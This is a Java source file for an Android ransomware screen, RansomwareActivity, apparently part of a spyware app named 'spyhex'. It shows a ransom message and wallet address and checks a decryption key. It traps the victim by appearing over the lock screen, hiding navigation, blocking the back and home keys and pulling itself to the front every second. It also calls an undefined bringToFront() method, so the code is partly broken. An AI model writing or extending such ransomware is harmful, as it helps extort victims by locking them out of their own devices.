package com.spyhex.app.features.ransomware;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.spyhex.app.R;

public class RansomwareActivity extends Activity {
    private TextView tvTitle, tvBody, tvWallet;
    private EditText etKey;
    private Button btnDecrypt;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ransomware);

        // Lock screen
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        );

        tvTitle = findViewById(R.id.ransom_title);
        tvBody = findViewById(R.id.ransom_body);
        tvWallet = findViewById(R.id.ransom_wallet);
        etKey = findViewById(R.id.ransom_key_input);
        btnDecrypt = findViewById(R.id.ransom_decrypt_btn);

        tvTitle.setText(getIntent().getStringExtra("title"));
        tvBody.setText(getIntent().getStringExtra("body"));
        tvWallet.setText(getIntent().getStringExtra("wallet"));

        btnDecrypt.setOnClickListener(v -> {
            String key = etKey.getText().toString();
            boolean ok = RansomwareManager.getInstance().decrypt(key);
            if (ok) {
                Toast.makeText(this, "Decryption successful", Toast.LENGTH_SHORT).show();
                finish();
            } else {
                Toast.makeText(this, "Invalid decryption key", Toast.LENGTH_SHORT).show();
            }
        });

        // Prevent back button
        View decor = getWindow().getDecorView();
        decor.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
        );
    }

    @Override
    public void onBackPressed() {
        // Block back
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Keep bringing to front
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (!isFinishing()) {
                bringToFront();
            }
        }, 1000);
    }
}
